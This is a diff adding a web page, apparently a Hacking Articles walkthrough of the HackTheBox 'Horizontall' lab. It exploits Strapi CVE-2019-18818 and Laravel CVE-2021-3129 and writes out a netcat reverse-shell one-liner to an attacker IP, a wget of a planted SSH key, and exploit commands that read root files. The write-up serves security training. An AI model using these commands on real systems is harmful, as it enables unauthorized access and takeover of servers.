@@ -1,0 +1,115 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Horizontall HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/horizontall-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-02-15T19:09:31+00:00">February 15, 2022</time><time class="updated" datetime="2025-06-19T14:31:28+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Horizontall is an “easy” rated CTF Linux box on Hack The Box platform. The box covers initial compromise by exploiting Strapi RCE vulnerability and escalating privileges by tunnelling an internal application (Laravel) to a local machine and running a PoC exploit on Laravel v 7.4.18</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Subdomain enumeration using wfuzz</span></li>
+<li><span style="color: #000000;">Strapi password reset exploit</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting strapi <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818">CVE-2019-18818</a></strong></span> to gain a reverse shell</span></li>
+<li><span style="color: #000000;">Initial information gathering</span></li>
+<li><span style="color: #000000;">Setting up my SSH key in the victim’s authorized_keys file</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Tunnelling internal website to our system</span></li>
+<li><span style="color: #000000;">Exploiting Laravel <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129">CVE-2021-3129</a></strong></span> to snag root flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s begin</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">Firstly, we will run a nmap scan on the victim machine</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC -Pn 10.129.149.92</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgpA-ERDt2IsmWu1onaA-eMoZwP8bM2uw9PiJTKSVhKoFR54wVRzWG5wS5slegvKNv96-piH_BX9d2EJ-JBGaOxii2snN8fZzMBYisTeSiDuFnZrphFY1QlfDB-xsujwKCaqC32lNPf9rvtTSaeahA3fCA0SdRdcQgGqnBHE8N0dIf74HfEzZcEmpP21w=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Since there was a website running on port 80, we added the address in our hosts file for resolution.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgwHC_tGTATWngd_dgXA-pUAoRGFprzxSxuAmRfl_NxWvjAqHwtYx98isQx33lw-Pk3q6v8Q7-tpRnFasx6qntPzKTpdYuzdY4-pQF7tIAZpkL8x-t8Z239lAQyjcHT_-2zJgTHYX_kL6XcNFtfXaxRLFWKj6I9AuIlnEzixwhDTRno1k8wZeSO6WhMBg=s16000"/></span></p>
+<p><span style="color: #000000;">We tried to look for exploitable vectors on the website itself but couldn’t find any which indicated that we need to enumerate directories.</span></p>
+<p><span style="color: #000000;">Even directories enum didn’t yield any results so we tried to enumerate subdomains.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" --sc 200 10.129.149.92</pre>
+<p><span style="color: #000000;">This returned back an interesting subdomain called api-prod</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjljDsUWotESFbHKm6-bWJCD12yfeQWqhWLTbpm0kPZQdpJ_xowE71mD7kN7mhG9QEk3gdWMGoZRbZfJjpYfqxp_vNI3aq0ebVNgqi3s6XhGsUoj71ravIYXcuS2rRR0ZtkjlpmPXDDmlHo1JwHJh0blgFHO9x6BrzxHqxcCOoaKBskwYg7JRUzgNIzNw=s16000"/></span></p>
+<p><span style="color: #000000;">We add this subdomain in hosts file and try to open the website.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "10.129.149.92   api-prod.horizontall.htb" &gt;&gt; /etc/hosts</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhpkAZ1FQs1vINrFT3yNzeAQkUBox1nTSnNah3GeSiEV2eTGyIPZ4cpdN_mH_lfagNRDvjotfYtJ836KXZX5RU_KFMmhJx3cItwy6f1yu515CYVjdbfSMR8LlZ9ynhLajeA7mrczF2tcplH1_NKjMKjlHF7-pFqrQGLiJ5ISMGKIt2SG_DJ0gKKyGx0_g=s16000"/></span></p>
+<p><span style="color: #000000;">It seemed like a plain website with no vectors again and thus, we tried directory enumeration. We found a directory /admin. Upon checking the components that made this website, we found the title to be strapi.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">whatweb http://api-prod.horizontall.htb/admin/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEimfroWYSUi1l_gg2u2KOWFlyXtQy0UO7pcFA_13LhNTK6-GU9OWI8g6P9dODQk8rTY7nSMAQ8kU-546CCQGx-XgQGXMNitJpK5N6MW1g50oQTdBQ5-PkpEHEtweHKNxBNt6GMKmDAVRcTbw_8Imz88hk1DWXvJCIP2G-r-JDqv3nPL6FCrGr9dPoBhhA=s16000"/></span></p>
+<p><span style="color: #000000;">We observed the response in burp and noticed strapi version to be <strong>3.0.0-beta 17.4</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCJ8FgYHLpzxFTOdtwRwzcnHXhtUbc2NH_ehA9tppXwpZUVlKdpIJWRz5XgsL9HCbz7x2_L96MfIcWW4um32hlBV8Ev-kaKCwF2LH6afj-GKoyTn8OFA3Xu6MIripA_Y12Sg0mGnZAlnPvt1zXMqwuhWLgLgddxw6sQcDesQWrxvUuDs7tImeGVplX5Q=s16000"/></strong></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Searchsploit results showed us an exploit for the given version was available. This version was afflicted with <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818">CVE-2019-18818</a>.</strong></span> This vulnerability allows an attacker to reset the admin password without needing authentication tokens. You can read more about the vulnerability <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://thatsn0tmysite.wordpress.com/2019/11/15/x05/">here</a></strong></span>. We downloaded the exploit using searchsploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">searchsploit -m 50239</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi5MFzlFitOzFqNd_7o471GSyoxDAOHL7QYU6SX4cAgVjYKlGVnrfgy7nKbgdxlJODdAoRzh3jgotusrqMRJJ0K0SLFZOEe2GBb6OBWvTTTJG5KdbIaUCQWIyiDXq9YaiYOH4j5S6f_IhKttnMJwPQU-bxXoOBSUCM5QrNdofCY8dypL9Gl7b0TqNHpog=s16000"/></span></p>
+<p><span style="color: #000000;">Running the exploit was quite simple, just passing the URL as an argument sufficed.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 50239.py http://api-prod.horizontall.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPw5s6mGSrjSKa3HKlIXmzsNZ2QsUw6qom0o5XW1U2elUnwKWleSjHqb_KoHP5XqgIYC-xMaIz_GxtpZE8u2h_5BmdRbo6o55fsXAauvM1hoXSIHzxzis1OdbMJTNurItvjBmzHwI5UJk1nMQBcj3VhNeFK184BHdpwqKIRbkTqYbW5IoI6JT5hYFmqg=s16000"/></span></p>
+<p><span style="color: #000000;">As you could see, the password was reset. One could login using this. AS you can see, in the response, we can confirm that the account is an admin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiCZbfNIbVqs0hk_8cAV88UA0mnnF9uFcQTbfNzx4kWEA0FHIORkofZ0-HZUAvtG4Znfh4eGmZB5XKvlkPoYnHLrpdTnH_BIn21FzsXLvfe6TfkY4h6nJB9M2reVcYQAsy6v9FfgPODNvGuu-jZ-IekYXpf3S8VAdLhyanIsdoFtrnX5yUaxWedOFTM_w=s16000"/></span></p>
+<p><span style="color: #000000;">However, the exploit also opened an option to run remote commands on the server! After a lot of tries, we found a reverse shell that seemed to be working.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.10 1234 &gt;/tmp/f</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhqlZFjAICLL-g8SiUYcxf554p3oRvYg9lLhfPSN5cf-1bd7d0U6ovBfJsCjLTySEzwoyczLEspFFHZXOhEhpNxzcwRymxuyCbMHWwvjDu5qwolq0EXkSuXHq_G4f8RDlz6Qlq2WjOpDBG-MbPdVMaieoVrknUfPggBtJwEfKKAPZvUrCeS7kqjJW_A5g=s16000"/></span></p>
+<p><span style="color: #000000;">We had already set up a listener on port 1234 which had now received a new session. We converted this into a proper teletype using python.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -nlvp 1234
+python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjQKE5mPfu0ng3p4Cj614K8GCMlPTDXOoi3TQotVKs2UKBSgB4SumnDSAGkx4-31yA2YEzsjEG9ypr7iGSKJ_TJOQQUC_Q2Q19qFKUu9cYJwNcRG0-r1pnZ0c55nmYmRmeHxj3nXtnDO_QLIkz6mCwITzJHN55kcIxr4xiULiaVYYoWiIUqwPWsra_d_w=s16000"/><br/>
+</strong></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Upon looking around this server, we observed a few unhelpful things. Finally, a netstat command gave us the path forward. The server seemed to be listening on port 8000. This could mean an internal service is running.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -plant</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEipnU1CdAA_KsSU0Bhk-r7F8JaDasCtyhhGpj8kxGWb7CqWrBly4rWPJjTvOyc6WvVsxJrRqwxDxyQ5RzIqY9zpTdmL8J2zaN-G8afn37W5gcQkF7q8-v3W1DP4j15UVfh3ti4Pgk-9Vg8mJ28I-WHl0g6-r5M0_lV4jLbRrKezOTZr8jXg0g9g5RAVLg=s16000"/></span></p>
+<p><span style="color: #000000;">Since there is no PID associated with the port, it means that the service was running. The best bet is a website. Another interesting thing was that the user strapi had rwx permissions on the .ssh directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd ~
+ls -la
+pwd
+cd .ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj4_gzVOHLD-vAMVm4QgjI8VbiAQRzsUOpa4-XcOT23_r4IH4jCRRLN0xYq6vNxdRghidlLgcC5M6VLd4QpYf47Q4aYcOWojiNhNS2LDPOjPB7NnceDagbPmPW-bGgwx1-tSHV6bqyQvNDWoe7blo2el22Z1IpW7-_7lEBptPcVYvzb8SkC8SnAB2tc8g=s16000"/></span></p>
+<p><span style="color: #000000;">Therefore, the plan forward is:</span></p>
+<ol>
+<li><span style="color: #000000;">Add my own SSH public key in the server’s authorized_keys</span></li>
+<li><span style="color: #000000;">Start a TCP tunnel to forward port 8000 to my local system</span></li>
+<li><span style="color: #000000;">Explore the service on port 8000.</span></li>
+</ol>
+<p><span style="color: #000000;">For this, I generated a new SSH key pair using ssh-keygen command</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgjmczvdIxNyfviTm0tvH3KHkKfZo_FvFxexzAFx7AUc51v3BGsiReY-7r1HV8M5DYMUN1Nyei7dCJZxCJwVitMrZwjcC8yjLsb5nQzV2j1NUft-a0YPHNssn6Yc1sYD-QrqYrU0wkX5XpQE0PFc-tT4fo5DmHKW5v7Y8at45oOTIvfnEMrbE-pO3tIVQ=s16000"/></span></p>
+<p><span style="color: #000000;">I then copied my id_rsa.pub key as authorized_keys and started a web server using python.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen
+cp id_rsa.pub authorized_keys
+python3 -m http.server 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgJCmgDdkQq_FaqPTi7qAcMzybNoMK-3eBfLUNZ57G19jKK1Z0rWdjh7tniiNeZUf4x870uzDTUv_Y0pBrIiHWGLIJUZq8jDVHv3WPRCEx6SL2Qie3wtgvmUcHMZs2iK9_D5bATRQOFc8QjRPYqB0WQ4b7VLpHOfeWgp73Nj_JQABTctbMdjvjD-2FwhA=s16000"/></span></p>
+<p><span style="color: #000000;">I then downloaded this file in my server using wget in the directory <strong>~ /.ssh</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://10.10.16.10/authorized_keys</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgPT7iV60gk9vSBLdK7eDeVI7RdmJ2-wbIpFZw_ewUl8wc5H3OqZ0n63eGtc-OdzKbioP0GHXc0jTftJE18DO3pqnM8NclM09PWMi6ndCxZJ-TPMMn6vRachjCjWgkn-l7Pp9J6JoAQkcnWXZvdg5c3XEKuF3coL5dmeDomMlxK0rmXLT7xTrTViG8U4w=s16000"/></span></p>
+<p><span style="color: #000000;">As it had got copied, we could now run an SSH tunnel and forward port 8000 to our local system’s port 8000 using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa -L 8000:localhost:8000 strapi@10.129.149.92</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg5P8O-YazC63GrD3ASQtSzgC7vF2il1g_B5-XYrhPEaqRkPreEo3stdTN0e3ahUodc9l85gHmS2v4u3KNmAgHwxsBqStVNeb0ZcZPAPbqLXy7smSRH8X4AIg-5oE0bdEBPjBZGv8x-queG6RB3H2eY05xSEdeseFNz-qwvmh96SwP_MeDdLjiw2mJxpA=s16000"/></span></p>
+<p><span style="color: #000000;">Then, upon traversing local port 8000 in the web browser, we observed that Laravel version 7.4.18 was running.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:8000</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiAXPSwohpMtVZcTJH0oBsHQyhdwEnb1jxJfwSOHgPQdvE5thNIdgdhfX56s9uN33rR0jZhUad0hhLv-2tvPmdaSFTQ4opweFMdAQo1osVMd0UtG1h8Sqicyov9VRSRtRgUP-HQcHXaIJK1laNJb1Tc1ykyF9XaGV_468sxDHIqhY4JgOQvgZjDzmwBYw=s16000"/></span></p>
+<p><span style="color: #000000;">This version is vulnerable to <a style="color: #000000;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129">CVE-2021-3129</a>. This vulnerability allows an attacker to execute code because of an insecure implementation of the file_get_contents() function. A PoC is available on github (ref <a style="color: #000000;" href="https://github.com/nth347/CVE-2021-3129_exploit.git">here</a>) which we cloned and ran.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/nth347/CVE-2021-3129_exploit.git
+cd CVE-2021-3129_exploit
+chmod +x exploit.py
+./exploit.py http://localhost:8000 Monolog/RCE1 id
+./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEidDZ8aYKOKJJfCc7h4kGGaqnWFvPISMV-dAZrUt1N7adEUKXVfGSZ1m4l1u-pTHadUW45IHQSMWOPYHu4X3rGRDqKAwUTH67CWW0jnla3jCR86YLCvh5cPrRNYGyMVlPK0h2WBwbSPugLCW1t4__qSGnEw5Be6TeB_LFt31apDr16MEijC61iJVbyijg=s16000"/></span></p>
+<p><span style="color: #000000;">And as you can see, the application was owned by root and thus we are able to execute commands as root. This is how we escalated our privileges and snagged the root flag.</span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">The lab offers a practical understanding of googling, understanding, finding public exploits and running them to exploit a server. In our humble opinion, the website is suitable for beginners or students practising for OSCP. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact<strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
